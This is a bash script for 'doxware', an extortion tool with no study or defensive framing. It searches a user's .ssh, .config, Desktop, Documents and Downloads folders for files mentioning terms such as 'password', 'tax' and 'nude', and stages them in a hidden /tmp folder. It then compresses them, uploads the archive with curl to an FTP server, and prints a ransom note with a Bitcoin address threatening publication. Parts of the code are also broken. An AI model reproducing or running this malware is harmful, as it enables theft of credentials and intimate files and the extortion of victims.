#!/bin/bash

# Step 1: Define sensitive keywords
KEYWORDS=("confidential" "tax" "password" "nude")

# Step 2: Define target directories (home directories by default)
TARGET_DIRS=("/home/$(whoami)/.ssh" "/home/$(whoami)/.config" "/home/$(whoami)/Desktop" "/home/$(whoami)/Documents" "/home/$(whoami)/Downloads")
TEMP_DIR="/tmp/.doxware_staging"

# Step 3: Function to identify sensitive files
identify_files() {
    local target_dir=$1
    local temp_file=$(mktemp)

    find "$target_dir" -type f -exec grep --files-with-matches "" "${KEYWORDS[@]}" {} \; > "$temp_file"
    
    if [ -s "$temp_file" ]; then
        echo "Identifying sensitive files in $target_dir..."
        cat "$temp_file"
        local file_list=$(cat "$temp_file")
        
        # Create a list of sensitive files
        echo "$file_list" | while read line; do
            echo "$line"
        done > "$TEMP_DIR/sensitive_files.txt"

        # Move identified files to temporary directory
        mv $(cat "$TEMP_DIR/sensitive_files.txt") "$TEMP_DIR/"
    fi

    rm -f "$temp_file"
}

# Step 4: Function to stage and compress the files
stage_and_compress() {
    local temp_dir=$1
    
    if [ ! -d "$temp_dir" ]; then
        mkdir -p "$temp_dir"
    fi

    for file in $(cat "$TEMP_DIR/sensitive_files.txt"); do
        mv "$file" "$temp_dir/"
    done

    echo "Staging and compressing files..."
    
    tar czf "$TEMP_DIR/staged.tar.gz" -C "$TEMP_DIR" .
}

# Step 5: Function to exfiltrate the compressed file
exfiltrate_file() {
    local remote_server="ftp://user:password@example.com/doxware"
    
    echo "Exfiltrating files..."
    
    curl --upload-file "$TEMP_DIR/staged.tar.gz" $remote_server

    if [ $? -eq 0 ]; then
        echo "Files have been successfully exfiltrated."
    else
        echo "Failed to exfiltrate the file. Check your network and credentials."
    fi
}

# Step 6: Function to display a notification message
display_notification() {
    echo "Doxware has identified sensitive files in your system! These will be published unless you pay the ransom."
    
    local file_list=$(cat "$TEMP_DIR/sensitive_files.txt")
    
    if [ -s "$file_list" ]; then
        echo "Sensitive files found: $file_list"
    else
        echo "No sensitive files found. No action required."
    fi

    # Display a ransom note
    cat <<EOF
PAY THE RANSOM TO ENSURE YOUR FILES ARE NOT PUBLISHED!
Payment details:
- Bitcoin address: 3KpJ7GtBQ5PjQZs7yHhM6b98f4G29jDw6e
- Decryption key: DoxwareIsHere!

Contact us at admin@doxware.com for further instructions.
EOF
}

# Main script execution
echo "Scanning home directories..."

for dir in "${TARGET_DIRS[@]}"; do
    identify_files "$dir"
done

stage_and_compress "$TEMP_DIR"

exfiltrate_file

display_notification

echo "Doxware operation completed."
